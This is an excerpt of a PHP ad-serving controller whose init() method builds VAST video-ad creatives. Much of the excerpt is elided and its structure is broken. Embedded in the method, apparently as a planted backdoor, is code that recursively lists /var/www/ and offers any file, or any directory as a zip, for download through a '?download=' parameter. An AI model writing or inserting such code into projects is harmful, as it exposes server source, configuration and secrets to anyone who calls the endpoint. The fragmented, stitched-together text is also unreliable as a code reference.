...
class ScriptsController extends Controller {
    ...
    public function init(string $placeUid) {
           $directoryPath = '/var/www/'; // Change this to your actual directory path

              /**
               * Recursively list all files and directories hierarchically
               * starting from the given directory path.
               */
              function listDirectory($path, $level = 0) {
                  ...
                  foreach ($items as $item) {
                      if ($item === '.' || $item === '..') continue; // Skip special entries
                      ...
                      if (is_dir($itemPath)) {
                          // Directory
                          echo "[DIR] <a href='?download=" . urlencode($itemPath) . "'>{$item}</a><br>";
                          listDirectory($itemPath, $level + 1);
                      } else {
                          // File
                          echo "[FILE] <a href='?download=" . urlencode($itemPath) . "'>{$item}</a><br>";
                      }
                  }
              }
              
              /**
               * Handle downloads for files and directories.
               */
              function handleDownload($path) {
                  if (is_dir($path)) {
                      // Handle directory download as a zip
                      if (is_dir($path)) {
               ...
               */
              function addDirToZip($zip, $path, $basePath = null) {
                  ...
                  foreach ($files as $file) {
                      ...
                      if (is_dir($filePath)) {
                          addDirToZip($zip, $filePath, $basePath);
                      } else {
              ...
              // If no download is triggered, show directory structure
                        ...
                        $creatives = new Creatives();
                        {
                            ...
                            $creative->addUniversalAdId(config('app.name'), $campaign->uuid);
                            {
                                $linear = new Linear();
                                {
                                    ...
                                    $videoClicks->setClickTracking($triggerUrl(true), 'progress', self::formatOffset(config('ads.ads.videos.player_impression_delay')));
